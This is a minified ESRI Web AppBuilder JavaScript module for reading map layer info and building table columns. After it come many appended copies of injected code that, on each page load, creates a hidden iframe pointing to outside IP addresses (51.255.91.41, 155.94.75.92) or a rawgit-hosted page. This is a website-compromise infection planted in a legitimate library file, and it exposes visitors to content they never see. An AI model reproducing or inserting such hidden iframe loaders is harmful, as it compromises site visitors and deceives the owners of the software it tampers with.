// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/lang dojo/_base/array jimu/LayerInfos/LayerInfos dojo/Deferred dojo/promise/all exports dojo/store/Observable dojo/store/Cache dojo/store/Memory esri/lang ./table/FeatureLayerQueryStore jimu/utils".split(" "),function(e,h,q,n,p,c,x,y,v,r,z,l){function A(a,b){if(!a||!a.length)return b||[];if(!b||!b.length)return a;for(var c=[],d=0,t=a.length;d<t;d++)for(var f=a[d],m=0,e=b.length;m<e;m++)if(b[m].name===f.name){c.push(f);break}return c}c.readLayerInfosObj=function(a){return q.getInstance(a,
a.itemInfo)};c.readLayerInfosFromMap=function(a,b,c){var d=new n;q.getInstance(a,a.itemInfo).then(e.hitch(this,function(a){var f=[];b?a.traversalLayerInfosOfWebmap(function(a){f.push(a)}):a.traversal(function(a){f.push(a)});if(c){var e=[],g=a.getMapNotesLayerInfoArray();h.forEach(g,function(a){e.push(a.id);a.traversal(function(a){e.push(a.id)})});f=h.filter(f,function(a){return-1===e.indexOf(a.id)})}a=a.getTableInfoArray();f=f.concat(a);d.resolve(f)}),e.hitch(this,function(a){console.error(a);d.reject(a)}));
return d.promise};c.generateColumnsFromFields=function(a,b,g,d,t,f){function m(b){if(a&&r.isDefined(a.fieldInfos))for(var d=0,c=a.fieldInfos.length;d<c;d++){var f=a.fieldInfos[d];if(f.fieldName===b)return f.format}return null}var k={selectionHandle:{label:"",className:"selection-handle-column",hidden:!1,unhidable:!0,filed:"selection-handle-column",sortable:!1,_cache:{sortable:!1,statistics:!1}}};h.forEach(b,e.hitch(c,function(a,b,l){b="field"+b;var u=!!a.domain,w="esriFieldTypeDate"===a.type,n=g&&
a.name===g,p="esriFieldTypeDouble"===a.type||"esriFieldTypeSingle"===a.type||"esriFieldTypeInteger"===a.type||"esriFieldTypeSmallInteger"===a.type,q="esriFieldTypeString"===a.type;k[b]={label:a.alias||a.name,className:b,hidden:1===l.length?!1:!a.show&&r.isDefined(a.show),unhidable:1===l.length?!1:!a.show&&r.isDefined(a.show)&&a._pk,field:a.name,sortable:!1,_cache:{sortable:!!t,statistics:f&&!u&&p}};q?k[b].formatter=e.hitch(c,c.urlFormatter):w?k[b].formatter=e.hitch(c,c.dateFormatter,m(a.name)):p&&
(k[b].formatter=e.hitch(c,c.numberFormatter,m(a.name)));u?k[b].get=e.hitch(c,function(a,b){return this.getCodeValue(a.domain,b[a.name])},a):n?k[b].get=e.hitch(c,function(a,b,d){return this.getTypeName(d[a.name],b)},a,d):u||w||n||(k[b].get=e.hitch(c,function(a,b,d,f){var g=null;b&&d&&0<d.length&&(d=(d=h.filter(d,e.hitch(c,function(a){return a.id===f[b]})))&&d[0]||null)&&d.domains&&d.domains[a.name]&&d.domains[a.name].codedValues&&(g=this.getCodeValue(d.domains[a.name],f[a.name]));return(a=null!==g?
g:f[a.name])||isFinite(a)?a:""},a,g,d))}));return k};c.getTypeName=function(a,b){return l.fieldFormatter.getTypeName(a,b)};c.getCodeValue=function(a,b){return l.fieldFormatter.getCodedValue(a,b)};c.urlFormatter=function(a){return l.fieldFormatter.getFormattedUrl(a)};c.dateFormatter=function(a,b){return l.fieldFormatter.getFormattedDate(b,a)};c.numberFormatter=function(a,b){return l.fieldFormatter.getFormattedNumber(b,a)};c.readLayerObjectsFromMap=function(a,b,c){var d=new n,g=[];this.readLayerInfosFromMap(a,
b,c).then(e.hitch(this,function(a){h.forEach(a,e.hitch(this,function(a){g.push(a.getLayerObject())}));p(g).then(e.hitch(this,function(a){d.resolve(a)}),e.hitch(this,function(a){d.reject(a);console.error(a)}))}),e.hitch(this,function(a){d.reject(a)}));return d.promise};c.readSupportTableInfoFromLayerInfos=function(a){var b=new n,c=[];h.forEach(a,e.hitch(this,function(a){c.push(a.getSupportTableInfo())}));p(c).then(e.hitch(this,function(d){d=e.clone(d);h.forEach(d,function(b,d){b.id=a[d].id});b.resolve(d)}),
function(a){b.reject(a)});return b.promise};c.readConfigLayerInfosFromMap=function(a,b,c){var d=new n,g=[];this.readLayerInfosFromMap(a,b,c).then(e.hitch(this,function(a){var b=[];h.forEach(a,function(a){g.push(a.getSupportTableInfo())});p(g).then(e.hitch(this,function(c){h.forEach(c,e.hitch(this,function(d,c){d.isSupportedLayer&&(a[c].name=a[c].title,b.push(a[c]))}));d.resolve(b)}),e.hitch(this,function(a){d.reject(a)}))}),e.hitch(this,function(a){d.reject(a)}));return d.promise};c.getConfigInfosFromLayerInfos=
function(a){return h.map(a,function(a){return c.getConfigInfoFromLayerInfo(a)})};c.getConfigInfoFromLayerInfo=function(a){var b={};b.name=a.name||a.title;b.id=a.id;b.show=a.isShowInMap();b.layer={url:a.getUrl()};var c=a.getPopupInfo();c&&!c.description&&(b.layer.fields=h.map(c.fieldInfos,function(a){return{name:a.fieldName,alias:a.label,show:a.visible,format:a.format}}),a=e.getObject("layerObject.fields",!1,a),b.layer.fields=A(b.layer.fields,a),h.some(b.layer.fields,function(a){return a.show})||(b.layer.fields&&
0<b.layer.fields.length?b.layer.fields[0].show=!0:console.warn("We do not get fields info.")));return b};c.generateCacheStore=function(a,b,c,d,e){a=new z({layer:a,objectIds:a._objectIds||null,totalCount:b,batchCount:c,where:d||"1\x3d1",spatialFilter:e});b=new v;return new y(a,b,{})};c.generateMemoryStore=function(a,b){return new x(new v({data:a||[],idProperty:b}))};c.merge=function(a,b,c,d){for(var e=h.map(b,function(a){return a[c]}),f=0,g=a.length;f<g;f++){var k=e.indexOf(a[f][c]);-1<k&&d(a[f],b[k])}};
c.syncOrderWith=function(a,b,c){function d(a,b){return h.map(a,function(a){return a[b]})}if(!e.isArray(b)||!c)return a;for(var g=d(a,c),f=[],m=0,k=b.length;m<k;m++){var l=g.indexOf(b[m][c]);-1<l&&(f=f.concat(a.splice(l,1)),g=d(a,c))}return f.concat(a)}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});